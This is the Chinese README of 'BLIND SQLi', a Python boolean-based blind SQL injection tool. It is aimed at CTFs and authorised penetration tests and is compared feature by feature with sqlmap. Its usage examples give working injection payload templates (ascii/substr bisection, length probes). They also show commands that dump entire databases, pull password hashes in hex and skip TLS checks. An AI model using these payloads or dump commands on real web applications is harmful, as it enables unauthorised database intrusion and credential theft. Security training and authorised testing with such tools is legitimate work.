# ⚡ BLIND SQLi

> 通用 Boolean-Based SQL 盲注提取工具，为 CTF、授权测试与本地靶场场景打磨的轻量级单文件脚本。

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)
![Version](https://img.shields.io/badge/version-1.5.2-important)
![依赖](https://img.shields.io/badge/dependencies-requests%20only-9cf)
![平台](https://img.shields.io/badge/platform-Windows%20%2F%20Linux%20%2F%20macOS-lightgrey)

## 目录

- [特性](#特性)
- [与 sqlmap 的对比](#与-sqlmap-的对比)
- [快速开始](#快速开始)
- [使用示例](#使用示例)
- [参数速查](#参数速查)
- [历史结果管理](#历史结果管理)
- [安全声明](#安全声明)

## 特性

- **单文件、零依赖负担**：整个工具就是一个 `blind_sqli.py`，只需 `pip install requests` 即可运行，拷贝到任何机器（包括靶机）都能直接使用。
- **智能 true/false 特征识别**：自动识别响应差异（marker / 页面长度 / 状态码三级策略），针对静态页面做了专门优化——即使 true/false 响应只差 2 个字节（如 `query_success` vs `query_error`）也能稳定识别。
- **回显感知（echo-aware）**：自动剔除落在“请求回显区”的伪特征，并用真实提取 payload 复核，杜绝“基线探测能过、正式提取全废”。
- **自动闭合方式探测**：数字型、单引号、双引号、括号等常见闭合方式自动识别，无需手工猜测。
- **精细化盲注提取**：长度二分 + ASCII 二分 + 等值校验三重机制；可选字符集边界预检；支持 `--hex` 直接提取十六进制数据。
- **并发与断点**：多线程并发加速提取；断点续传 + 中间结果落盘（带保存节流）。
- **一键枚举数据库**：`--dump`（跳过系统库）/ `--dump-all`（含系统库）自动完成「数据库 → 表 → 列 → 全量数据」枚举，结果保存到 `result/` 目录并自动回放。
- **关键词搜索**：`--dump-flag <关键词>` 在表名、列名、数据中搜索包含关键词的内容，命中部分红色高亮。
- **历史管理**：`--view [URL]` 随时回看历次 dump 记录，结果文件按「主机_端口_时间」命名，不覆盖旧记录。
- **Windows 友好**：双击运行不闪退（`Press Enter to continue...`）、GBK 控制台自动 UTF-8 容错、原生支持 ANSI 颜色。

## 与 sqlmap 的对比

| 维度 | BLIND SQLi | sqlmap |
| --- | --- | --- |
| 体积与依赖 | 单文件，仅依赖 requests | 大型工程，依赖众多 |
| 启动速度 | < 1 秒 | 数秒 |
| 注入类型 | Boolean-Based 盲注（专精） | 全类型：布尔 / 报错 / 时间 / UNION / 堆叠 / OOB |
| 数据库支持 | MySQL 系 | MySQL / MSSQL / Oracle / PostgreSQL / SQLite 等 |
| 上手成本 | 参数少，`-h` 分组清晰 | 功能全但参数海量 |
| 输出噪音 | 简洁，直达结果 | 日志与提示较多 |
| 定制性 | payload 模板完全透明，可手写任意表达式 | 自定义需 tamper 体系 |
| 结果管理 | `result/` + `--view` 一键回看 | session / output 机制较复杂 |

### 本工具占优的场景

1. **CTF 抢时间**：对静态靶场页面的特征识别极快，实测 4 线程约 12 秒提取 32 位 flag；sqlmap 的检测阶段更长、输出更啰嗦。
2. **手写 payload 绕过滤**：`--payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -"` 这类模板直接暴露在命令行，表达式随便改，不需要学 tamper 脚本。
3. **受限环境部署**：一个文件 + requests 就能跑，无需拖整个目录树。
4. **Windows 双击用户**：不闪退、不乱码，看完结果按回车退出。
5. **结果归档复盘**：一键全量 dump + 按时间存档 + 关键词搜索高亮 + 历史回看，打完 CTF 随时复盘。

### 什么时候应该用 sqlmap

- 需要报错注入、时间盲注、UNION、堆叠查询、OOB 等高级注入手法；
- 目标不是 MySQL（如 MSSQL / Oracle / PostgreSQL）；
- 需要自动爬取表单、自动发现注入点、WAF 绕过、哈希破解、`--os-shell` 等能力；
- 大规模资产测试或 API 集成。

一句话：**sqlmap 是瑞士军刀，BLIND SQLi 是一把为布尔盲注场景磨快的专用刀。**

## 快速开始

```bash
# 1. 安装依赖
pip install requests

# 2. 全自动提取（自动探测闭合方式 + 自动识别 true/false 特征）
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select flag from flag" --probe-closure --auto-mark

# 3. 全自动枚举整个数据库（库 → 表 → 列 → 全量数据）
python blind_sqli.py -u "http://target/index.php?id=1" --dump
```

## 使用示例

```bash
# 1) 基础用法：手动指定 true 特征，提取单条查询
python blind_sqli.py -u "http://target/index.php?id=1" -p id \
    -q "select flag from flag" --true-mark "Welcome"

# 2) 字符型注入（单引号闭合）：需显式指定 payload 模板
python blind_sqli.py -u "http://target/index.php?id=1" -p id \
    -q "select flag from secret" --true-mark "User found" \
    --payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -" \
    --eq-payload "1' and ascii(substr(({query}),{i},1))={mid}-- -" \
    --len-payload "1' and length(({query}))>{mid}-- -"

# 3) 提取 HEX 数据（如密码哈希）
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select password from users limit 1" --hex

# 4) 高并发 + 断点续传（适合长时间提取）
python blind_sqli.py -u "http://target/index.php?id=1" -t 8 \
    --resume result.tmp --save-every 10

# 5) 全量枚举：--dump 跳过系统库，--dump-all 包含系统库
python blind_sqli.py -u "http://target/index.php?id=1" --dump
python blind_sqli.py -u "http://target/index.php?id=1" --dump-all

# 6) 关键词搜索并高亮（表名/列名/数据，不含系统库）
python blind_sqli.py -u "http://target/index.php?id=1" --dump-flag flag

# 7) 查看历史 dump 记录
python blind_sqli.py --view "http://target.com"   # 指定目标的最新记录
python blind_sqli.py --view                       # 列出全部历史
```

> 详细说明与完整示例见 `python blind_sqli.py --help`，选项按「基本参数 / 特征自动识别 / 请求控制 / 提取控制 / 数据库枚举 / 其他」分组展示。

## 参数速查

| 参数 | 说明 |
| --- | --- |
| `-u, --url` | 目标 URL（含 `?id=1` 会自动剥离查询串，避免双参数歧义） |
| `-p, --param` | 注入参数名 |
| `-q, --query` | 要提取的 SQL 查询 |
| `--auto-mark` | 自动识别 true/false 响应特征 |
| `--probe-closure` | 自动探测闭合方式 |
| `--true-mark` | 手动指定 true 特征字符串 |
| `--payload / --eq-payload / --len-payload` | 大于 / 等值 / 长度判断的 payload 模板 |
| `-t, --threads` | 并发线程数 |
| `--resume / --save-every / --save-interval` | 断点续传与保存节流 |
| `--hex` | 提取 `hex(({query}))` 结果，字符集自动收缩为十六进制 |
| `--dump` | 全量拉取用户数据库（跳过系统库），保存到 `result/` |
| `--dump-all` | 全量拉取所有数据库（含系统库） |
| `--dump-flag 关键词` | 搜索表名/列名/数据并高亮命中（也支持 `-dump-flag`） |
| `--view [URL]` | 查看历史 dump 记录 |
| `--no-verify` | 跳过 TLS 证书校验（自签名证书目标） |
| `--non-interactive` | Windows 下退出时不等待回车（无人值守） |

## 历史结果管理

- 每次 `--dump` / `--dump-all` 的结果自动保存到脚本同目录的 `result/` 文件夹；
- 文件名格式：`主机_端口_年月日-时分.txt`，例如 `challenge-xxx.sandbox.ctfhub.com_10800_2026-8-26-18-48.txt`；
- 同一分钟重复执行自动追加序号，不覆盖旧记录；
- `--view URL` 查看指定目标的最新记录，`--view` 列出全部历史。

## 安全声明

> 本工具仅用于 CTF 竞赛、授权渗透测试或本地靶场。请勿对未获得授权的系统使用，滥用后果自负。
